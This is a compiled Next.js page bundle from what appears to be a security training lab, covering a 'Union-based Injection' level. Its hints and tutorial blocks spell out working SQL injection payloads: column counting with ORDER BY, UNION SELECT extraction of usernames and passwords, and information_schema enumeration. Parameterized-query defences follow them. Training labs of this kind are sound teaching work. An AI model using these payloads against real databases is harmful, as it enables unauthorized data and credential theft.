(()=>{var e={};e.id=924,e.ids=[924],e.modules={2934:e=>{"use strict";e.exports=require("next/dist/client/components/action-async-storage.external.js")},4580:e=>{"use strict";e.exports=require("next/dist/client/components/request-async-storage.external.js")},5869:e=>{"use strict";e.exports=require("next/dist/client/components/static-generation-async-storage.external.js")},399:e=>{"use strict";e.exports=require("next/dist/compiled/next-server/app-page.runtime.prod.js")},8518:(e,s,t)=>{"use strict";t.r(s),t.d(s,{GlobalError:()=>i.a,__next_app__:()=>u,originalPathname:()=>m,pages:()=>d,routeModule:()=>x,tree:()=>c}),t(8085),t(2029),t(5866);var r=t(3191),a=t(8716),n=t(7922),i=t.n(n),l=t(5231),o={};for(let e in l)0>["default","tree","pages","GlobalError","originalPathname","__next_app__","routeModule"].indexOf(e)&&(o[e]=()=>l[e]);t.d(s,o);let c=["",{children:["level3",{children:["__PAGE__",{},{page:[()=>Promise.resolve().then(t.bind(t,8085)),"c:\\Users\\YASSER\\Documents\\GitHub\\Lab-Security\\src\\app\\level3\\page.tsx"]}]},{}]},{layout:[()=>Promise.resolve().then(t.bind(t,2029)),"c:\\Users\\YASSER\\Documents\\GitHub\\Lab-Security\\src\\app\\layout.tsx"],"not-found":[()=>Promise.resolve().then(t.t.bind(t,5866,23)),"next/dist/client/components/not-found-error"]}],d=["c:\\Users\\YASSER\\Documents\\GitHub\\Lab-Security\\src\\app\\level3\\page.tsx"],m="/level3/page",u={require:t,loadChunk:()=>Promise.resolve()},x=new r.AppPageRouteModule({definition:{kind:a.x.APP_PAGE,page:"/level3/page",pathname:"/level3",bundlePath:"",filename:"",appPaths:[]},userland:{loaderTree:c}})},3057:(e,s,t)=>{Promise.resolve().then(t.bind(t,8004))},8004:(e,s,t)=>{"use strict";t.r(s),t.d(s,{default:()=>n});var r=t(326),a=t(8530);function n(){let e=async e=>{try{let s=await fetch("/api/level3",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)});return await s.json()}catch(e){return{success:!1,error:"Failed to connect to server"}}};return r.jsx("div",{className:"min-h-screen bg-gradient-to-br from-cyber-dark via-gray-900 to-cyber-dark py-12",children:(0,r.jsxs)("div",{className:"container mx-auto px-6",children:[r.jsx(a.Z,{level:3,title:"Union-based Injection",description:"This level focuses on UNION SELECT attacks, which allow attackers to extract data from other tables by combining the results of multiple SELECT statements. You'll need to determine the structure of the original query first.",onSubmit:e,hints:["This level is designed for UNION SELECT attacks","First determine the number of columns in the original query","Use ORDER BY to find the column count: ' ORDER BY 5--","Try: ' UNION SELECT username, password, email, role, id FROM users--","The original query selects: id, username, email, role, created_at"],isVulnerable:!0}),r.jsx("div",{className:"mt-12 max-w-4xl mx-auto",children:(0,r.jsxs)("div",{className:"vulnerability-card rounded-lg p-8",children:[r.jsx("h2",{className:"text-2xl font-semibold mb-6 text-cyber-blue",children:"\uD83D\uDD0D Technical Details"}),(0,r.jsxs)("div",{className:"space-y-6",children:[(0,r.jsxs)("div",{children:[r.jsx("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"UNION Attack Methodology:"}),r.jsx("div",{className:"code-block",children:`-- Step 1: Determine number of columns
' ORDER BY 1--  (success)
' ORDER BY 2--  (success)
' ORDER BY 5--  (success)
' ORDER BY 6--  (error - too many columns)

-- Step 2: Find which columns are displayed
' UNION SELECT 1,2,3,4,5--

-- Step 3: Extract sensitive data
' UNION SELECT username, password, email, role, id FROM users--
' UNION SELECT table_name, column_name, 1, 2, 3 FROM information_schema.columns--`})]}),(0,r.jsxs)("div",{children:[r.jsx("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Requirements for UNION Attacks:"}),(0,r.jsxs)("ul",{className:"space-y-2 text-gray-300",children:[(0,r.jsxs)("li",{className:"flex items-start",children:[r.jsx("span",{className:"text-cyber-blue mr-2",children:"•"}),"Same number of columns in both SELECT statements"]}),(0,r.jsxs)("li",{className:"flex items-start",children:[r.jsx("span",{className:"text-cyber-blue mr-2",children:"•"}),"Compatible data types in corresponding columns"]}),(0,r.jsxs)("li",{className:"flex items-start",children:[r.jsx("span",{className:"text-cyber-blue mr-2",children:"•"}),"Knowledge of table and column names (or good guessing)"]}),(0,r.jsxs)("li",{className:"flex items-start",children:[r.jsx("span",{className:"text-cyber-blue mr-2",children:"•"}),"Application must display the query results"]})]})]}),(0,r.jsxs)("div",{children:[r.jsx("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Information Gathering Queries:"}),r.jsx("div",{className:"code-block",children:`-- Database version and user
' UNION SELECT version(), user(), 3, 4, 5--

-- List all tables
' UNION SELECT table_name, 2, 3, 4, 5 FROM information_schema.tables--

-- List columns for a specific table
' UNION SELECT column_name, data_type, 3, 4, 5 FROM information_schema.columns WHERE table_name='users'--

-- Extract passwords
' UNION SELECT username, password, 3, 4, 5 FROM users--`})]}),(0,r.jsxs)("div",{children:[r.jsx("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Defense Strategies:"}),r.jsx("div",{className:"code-block",children:`// Use parameterized queries
const query = "SELECT id, username, email, role, created_at FROM users WHERE username = $1";

// Input validation
if (!/^[a-zA-Z0-9_]+$/.test(username)) {
  throw new Error('Invalid username format');
}

// Whitelist allowed characters
const sanitized = username.replace(/[^a-zA-Z0-9_]/g, '');`})]})]})]})})]})})}},8085:(e,s,t)=>{"use strict";t.r(s),t.d(s,{default:()=>r});let r=(0,t(8570).createProxy)(String.raw`c:\Users\YASSER\Documents\GitHub\Lab-Security\src\app\level3\page.tsx#default`)}};var s=require("../../webpack-runtime.js");s.C(e);var t=e=>s(s.s=e),r=s.X(0,[276,471,802],()=>t(8518));module.exports=r})();